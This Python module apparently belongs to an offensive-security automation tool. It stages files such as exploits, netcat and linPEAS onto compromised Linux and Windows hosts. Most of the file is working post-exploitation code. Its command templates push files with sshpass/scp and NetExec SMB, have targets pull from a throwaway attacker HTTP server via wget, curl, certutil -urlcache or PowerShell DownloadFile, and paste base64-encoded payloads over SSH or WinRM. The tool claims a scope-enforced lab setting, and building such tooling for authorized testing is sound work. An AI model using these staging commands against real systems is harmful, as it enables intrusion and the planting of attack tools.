"""Transfer layer — move staged material onto a foothold, with redundancy (§8).

Once obol has a material in its Kali cache (`provision.py`) and a proven foothold on
a host (`sessions.py`), this module pushes the file onto that host. Lab file
transfer fails for boring reasons — no scp, a read-only share, egress filtering, a
constrained shell — so obol does not rely on one method. It keeps a **registry of
transfer channels** ordered by preference and **cascades**: it tries the best
channel available for this foothold, and on failure falls back to the next, until
one lands (and, where the channel affords it, a sha256 read-back verifies the copy
is intact).

Design decisions (see `docs/PAYLOAD_STAGING.md`):

- **One runner, one store.** Every push and verify runs through the shared
  scope-enforced runner (`service.run_action`), so a transfer can only touch an
  authorized target and every command lands in the same ledger as everything else.
- **A staged file is live state, not a Fact.** The result is recorded in
  `Workspace.staged` with a mutable status (staged/verified/failed) — a file can be
  deleted from the box; a Fact cannot flip.
- **Channels are data, not planner branching.** The method slate and its preference
  order live in `CHANNELS`, like the tool/session/tunnel registries.

The channels assume the common lab routes off a shell/credential:

- **Linux foothold:** `scp` (sshpass), an HTTP pull (`wget`/`curl`) from a throwaway
  obol file server, and a base64 paste over the SSH exec channel (no extra service).
- **Windows foothold:** SMB `--put-file` (NetExec), a `certutil` or PowerShell
  download from the obol file server over the WinRM exec channel, a base64
  PowerShell `WriteAllBytes` paste, and a guided `evil-winrm upload`.

Pass-the-hash variants and the shell-catching listener server are follow-ups
(`§8` PR#4); this slice is password/credential-based and uses a transient file
server for the pull channels.
"""
from __future__ import annotations

import base64
import contextlib
import functools
import http.server
import os
import socket
import threading
from dataclasses import dataclass, field
from pathlib import Path

from . import board, provision, sessions
from .pack import Action
from .scope import normalize_target
from .workspace import Workspace

# base64/exec channels inline the whole file on one command line, so they are only
# offered for small material (exploits, nc), never a 1 MB linPEAS.
_B64_MAX_BYTES = 250_000


class StagingError(Exception):
    """A transfer request that cannot be built (unknown material/host/channel, no
    foothold credential, or the material is not available locally)."""


@dataclass(frozen=True)
class TransferChannel:
    key: str
    label: str
    os: str                          # "linux" | "windows"
    needs: tuple[str, ...]           # capability tokens: "cred", "http-serve", "b64"
    push_template: str
    verify_template: str = ""        # prints the remote file's sha256; "" = no verify
    allow_shell: bool = False        # push needs shell metacharacters (base64 redirect)
    default_remote_dir: str = ""
    guided: bool = False             # not auto-run — command handed to the operator
    max_bytes: int = 0               # 0 = no limit; >0 = only suitable up to this size
    priority: int = 100              # lower runs first in the cascade
    note: str = ""


# ── the channel slate (preference order via priority) ─────────────────────────
CHANNELS: tuple[TransferChannel, ...] = (
    # Linux ---------------------------------------------------------------------
    TransferChannel(
        key="scp", label="scp (sshpass)", os="linux", needs=("cred",), priority=10,
        default_remote_dir="/tmp",
        push_template="sshpass -p {{password}} scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{local}} {{user}}@{{target}}:{{remote}}",
        verify_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} sha256sum {{remote}}",
    ),
    TransferChannel(
        key="wget-pull", label="wget from obol server", os="linux",
        needs=("cred", "http-serve"), priority=20, default_remote_dir="/tmp",
        push_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} wget -q http://{{lhost}}:{{port}}/{{name}} -O {{remote}}",
        verify_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no {{user}}@{{target}} sha256sum {{remote}}",
    ),
    TransferChannel(
        key="curl-pull", label="curl from obol server", os="linux",
        needs=("cred", "http-serve"), priority=25, default_remote_dir="/tmp",
        push_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} curl -s -o {{remote}} http://{{lhost}}:{{port}}/{{name}}",
        verify_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no {{user}}@{{target}} sha256sum {{remote}}",
    ),
    TransferChannel(
        key="b64-ssh", label="base64 over SSH exec", os="linux", needs=("cred", "b64"),
        priority=40, default_remote_dir="/tmp", allow_shell=True, max_bytes=_B64_MAX_BYTES,
        push_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {{user}}@{{target}} echo {{b64}} | base64 -d > {{remote}}",
        verify_template="sshpass -p {{password}} ssh -o StrictHostKeyChecking=no {{user}}@{{target}} sha256sum {{remote}}",
        note="no extra service needed; small files only",
    ),
    # Windows -------------------------------------------------------------------
    TransferChannel(
        key="smb-put", label="SMB put-file (NetExec)", os="windows", needs=("cred",),
        priority=10, default_remote_dir="\\Windows\\Temp",
        push_template="nxc smb {{target}} -u {{user}} -p {{password}} --put-file {{local}} {{remote}}",
        note="writes to the C$ share; needs a share the credential can write",
    ),
    TransferChannel(
        key="certutil-pull", label="certutil from obol server", os="windows",
        needs=("cred", "http-serve"), priority=20, default_remote_dir="C:\\Windows\\Temp",
        push_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x \"certutil -urlcache -split -f http://{{lhost}}:{{port}}/{{name}} {{remote}}\"",
        verify_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x \"certutil -hashfile {{remote}} SHA256\"",
    ),
    TransferChannel(
        key="ps-pull", label="PowerShell download from obol server", os="windows",
        needs=("cred", "http-serve"), priority=25, default_remote_dir="C:\\Windows\\Temp",
        push_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x \"powershell -c (New-Object Net.WebClient).DownloadFile('http://{{lhost}}:{{port}}/{{name}}','{{remote}}')\"",
        verify_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x \"certutil -hashfile {{remote}} SHA256\"",
    ),
    TransferChannel(
        key="b64-ps", label="base64 over WinRM exec", os="windows", needs=("cred", "b64"),
        priority=40, default_remote_dir="C:\\Windows\\Temp", max_bytes=_B64_MAX_BYTES,
        push_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x \"powershell -c [IO.File]::WriteAllBytes('{{remote}}',[Convert]::FromBase64String('{{b64}}'))\"",
        verify_template="nxc winrm {{target}} -u {{user}} -p {{password}} -x \"certutil -hashfile {{remote}} SHA256\"",
        note="no extra service needed; small files only",
    ),
    TransferChannel(
        key="evil-winrm-upload", label="evil-winrm upload (guided)", os="windows",
        needs=("cred",), priority=90, guided=True, default_remote_dir="C:\\Windows\\Temp",
        push_template="evil-winrm -i {{target}} -u {{user}} -p {{password}}",
        note="interactive: run, then `upload {{local}} {{remote}}` in the session",
    ),
)

_BY_KEY = {c.key: c for c in CHANNELS}


def get_channel(key: str) -> TransferChannel | None:
    return _BY_KEY.get(key)


# ── foothold + lhost helpers ──────────────────────────────────────────────────
def _foothold_os(ws: Workspace, host: str) -> str:
    tf = ws.facts_for_target(host)
    if tf.has("foothold.windows") or tf.has("rdp.authenticated"):
        return "windows"
    if tf.has("foothold.linux") or tf.has("access.shell"):
        return "linux"
    for s in ws.sessions_for(host):
        if s.get("status") == "active" and s.get("os") in ("linux", "windows"):
            return s["os"]
    return ""


def lhost() -> str:
    """The Kali IP a target should call back to for a pull channel. Prefers
    $OBOL_LHOST, then a tun0 address, then the primary route's source IP. '' when
    none can be determined (pull channels are then skipped in the cascade)."""
    env = os.environ.get("OBOL_LHOST", "").strip()
    if env:
        return env
    # a VPN tun interface, if one is up (the usual HTB/OSCP case)
    try:
        import fcntl
        import struct
        for name in ("tun0", "tun1"):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                addr = fcntl.ioctl(s.fileno(), 0x8915,  # SIOCGIFADDR
                                   struct.pack("256s", name.encode()[:15]))
                return socket.inet_ntoa(addr[20:24])
            except OSError:
                continue
            finally:
                s.close()
    except (ImportError, OSError):
        pass
    try:  # primary outbound source IP (no packets actually sent)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return ""


@contextlib.contextmanager
def serve_cache(bind_lhost: str):
    """A throwaway HTTP server exposing the material cache so a pull channel on the
    target can fetch a file. Bound for the duration of one transfer, then torn down."""
    directory = str(provision.cache_dir())
    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=directory)
    httpd = http.server.ThreadingHTTPServer(("0.0.0.0", 0), handler)
    port = httpd.server_address[1]
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        yield bind_lhost, port
    finally:
        httpd.shutdown()
        httpd.server_close()


# ── remote path composition ───────────────────────────────────────────────────
def _remote_path(os_name: str, remote_dir: str, name: str) -> str:
    if os_name == "windows":
        return remote_dir.rstrip("\\") + "\\" + name
    return remote_dir.rstrip("/") + "/" + name


# ── channel eligibility ───────────────────────────────────────────────────────
def eligible_channels(ws: Workspace, host: str) -> list[dict]:
    """Which transfer channels fit this foothold, and whether each is ready. Ordered
    as the cascade would try them."""
    host = normalize_target(host)
    fos = _foothold_os(ws, host)
    cred = sessions.password_credential(ws, host)
    have_lhost = bool(lhost())
    rows: list[dict] = []
    for ch in sorted(CHANNELS, key=lambda c: c.priority):
        if fos and ch.os != fos:
            continue
        ready = True
        reason = ""
        if "cred" in ch.needs and not cred:
            ready, reason = False, "needs a validated password credential"
        elif "http-serve" in ch.needs and not have_lhost:
            ready, reason = False, "no callback IP (set OBOL_LHOST or bring up tun0)"
        rows.append({
            "key": ch.key, "label": ch.label, "os": ch.os, "guided": ch.guided,
            "ready": ready, "reason": reason, "priority": ch.priority, "note": ch.note,
        })
    return rows


def _cascade_for(ws: Workspace, host: str, material: provision.Material,
                 size: int, explicit: list[str] | None) -> list[TransferChannel]:
    fos = _foothold_os(ws, host)
    if not fos:
        raise StagingError(
            f"no proven foothold on {host} — log in first (`obol login {host}`) so "
            "obol knows the OS and has a channel to push over")
    have_lhost = bool(lhost())
    cred = sessions.password_credential(ws, host)
    if not cred:
        raise StagingError(
            f"no validated password credential for {host} — recover one first "
            "(pass-the-hash staging is a follow-up)")
    chosen: list[TransferChannel] = []
    for ch in sorted(CHANNELS, key=lambda c: c.priority):
        if ch.os != fos or ch.guided:
            continue
        if explicit and ch.key not in explicit:
            continue
        if "http-serve" in ch.needs and not have_lhost:
            continue
        if ch.max_bytes and size > ch.max_bytes:
            continue
        chosen.append(ch)
    if not chosen:
        raise StagingError(
            f"no auto-transfer channel available for a {fos} foothold on {host} "
            "(check credentials / callback IP, or stage manually)")
    return chosen


# ── the transfer ──────────────────────────────────────────────────────────────
def _push_action(channel: TransferChannel, template: str, tool: str) -> Action:
    return Action(id=f"stage-{channel.key}", title=f"Stage via {channel.label}",
                  tool=tool, commands=[{"tool": tool, "run": template}], produces=[])


def _fill(ws: Workspace, host: str, template: str, context: dict) -> str:
    return board.fill_template(template, ws, host, context)


def plan(ws: Workspace, host: str, material_key: str, *, channels: list[str] | None = None,
         remote_dir: str | None = None) -> dict:
    """The dry-run view: the ordered channel cascade and the exact commands, without
    fetching, touching the target, or recording state."""
    host = normalize_target(host)
    material = provision.get_material(material_key)
    if not material:
        raise StagingError(f"unknown material {material_key!r}")
    local_path = provision.resolve_path(material_key) or f"<cache>/{material.dest_name()}"
    size = 0
    with contextlib.suppress(OSError):
        size = Path(local_path).stat().st_size
    order = _cascade_for(ws, host, material, size, channels)
    cred = sessions.password_credential(ws, host) or {}
    steps = []
    for ch in order:
        rdir = remote_dir or ch.default_remote_dir
        remote = _remote_path(ch.os, rdir, material.dest_name())
        ctx = {"user": cred.get("user", ""), "password": cred.get("password", ""),
               "local": local_path, "remote": remote, "name": material.dest_name(),
               "lhost": lhost() or "<lhost>", "port": "<port>", "b64": "<base64>"}
        steps.append({"channel": ch.key, "label": ch.label,
                      "command": _fill(ws, host, ch.push_template, ctx),
                      "verify": _fill(ws, host, ch.verify_template, ctx) if ch.verify_template else ""})
    return {"host": host, "material": material_key, "local_path": local_path, "steps": steps}


def _run_channel(ws: Workspace, host: str, material: provision.Material,
                 channel: TransferChannel, local_path: str, remote: str, cred: dict,
                 surface: str) -> dict:
    """Run one channel's push (and verify). Returns {ok, verified, command, output}."""
    from .service import run_action

    ctx = {"user": cred.get("user", ""), "password": cred.get("password", ""),
           "local": local_path, "remote": remote, "name": material.dest_name(),
           "lhost": "", "port": ""}

    server = None
    if "http-serve" in channel.needs:
        server = serve_cache(lhost())
    if "b64" in channel.needs:
        ctx["b64"] = base64.b64encode(Path(local_path).read_bytes()).decode()

    try:
        if server is not None:
            host_ip, port = server.__enter__()
            ctx["lhost"], ctx["port"] = host_ip, str(port)
        tool = channel.push_template.strip().split()[0]
        outcome = run_action(ws, _push_action(channel, channel.push_template, tool),
                             target=host, context=ctx, allow_shell=channel.allow_shell,
                             ledger_extra={"surface": surface, "stage": channel.key,
                                           "material": material.key, "target": host})
        pushed = outcome.result.returncode == 0
        verified = False
        if pushed and channel.verify_template:
            v = run_action(ws, _push_action(channel, channel.verify_template, tool),
                           target=host, context=ctx, allow_shell=False,
                           ledger_extra={"surface": surface, "stage": f"{channel.key}-verify",
                                         "material": material.key, "target": host})
            verified = _verify_hash(v, material.key)
        return {"ok": pushed, "verified": verified, "command": outcome.command,
                "returncode": outcome.result.returncode}
    finally:
        if server is not None:
            with contextlib.suppress(Exception):
                server.__exit__(None, None, None)


def _verify_hash(outcome, material_key: str) -> bool:
    """True when the remote hash read-back matches the cached file's sha256."""
    idx = provision.load_index().get(material_key) or {}
    want = (idx.get("sha256") or "").lower()
    if not want:
        return False
    try:
        text = Path(outcome.result.stdout_path).read_text(errors="ignore").lower()
    except (OSError, AttributeError):
        return False
    return want in text.replace(" ", "")


def stage(ws: Workspace, host: str, material_key: str, *, channels: list[str] | None = None,
          remote_dir: str | None = None, surface: str = "cli") -> dict:
    """Push a material onto a foothold, cascading through channels until one lands.

    Ensures the material is cached locally first (the §8 preface), then tries each
    eligible channel in preference order; the first that pushes (and verifies, where
    the channel can) wins. Records the result as live staged state and returns
    ``{ok, staged, channel, attempts}``. Raises StagingError for a request that
    cannot be built."""
    host = normalize_target(host)
    material = provision.get_material(material_key)
    if not material:
        raise StagingError(f"unknown material {material_key!r}")
    if not ws.get_target(host):
        raise StagingError(f"unknown target {host!r} in this engagement")

    ensured = provision.ensure(material_key)
    if not ensured.get("ok"):
        raise StagingError(f"material not available locally: {ensured.get('error')}")
    local_path = ensured.get("path") or provision.resolve_path(material_key)
    size = 0
    with contextlib.suppress(OSError):
        size = Path(local_path).stat().st_size

    order = _cascade_for(ws, host, material, size, channels)
    cred = sessions.password_credential(ws, host)

    attempts: list[dict] = []
    for ch in order:
        rdir = remote_dir or ch.default_remote_dir
        remote = _remote_path(ch.os, rdir, material.dest_name())
        try:
            res = _run_channel(ws, host, material, ch, local_path, remote, cred, surface)
        except Exception as exc:  # noqa: BLE001 — a channel failing is expected; fall back
            attempts.append({"channel": ch.key, "ok": False, "error": str(exc)})
            continue
        attempts.append({"channel": ch.key, "ok": res["ok"], "verified": res["verified"],
                         "command": res.get("command", "")})
        if res["ok"]:
            idx = provision.load_index().get(material_key) or {}
            rec = ws.add_staged(
                host=host, material=material_key, remote_path=remote, channel=ch.key,
                status="verified" if res["verified"] else "staged",
                sha256=idx.get("sha256", ""), bytes=size, verified=res["verified"],
                local_path=local_path, push_command=res.get("command", ""),
                label=material.label)
            ws.save()
            return {"ok": True, "staged": rec, "channel": ch.key, "attempts": attempts}
    return {"ok": False, "staged": None, "channel": "", "attempts": attempts,
            "reason": "every transfer channel failed — check the foothold and credentials"}


__all__ = [
    "StagingError", "TransferChannel", "CHANNELS", "get_channel",
    "eligible_channels", "plan", "stage", "lhost", "serve_cache",
]
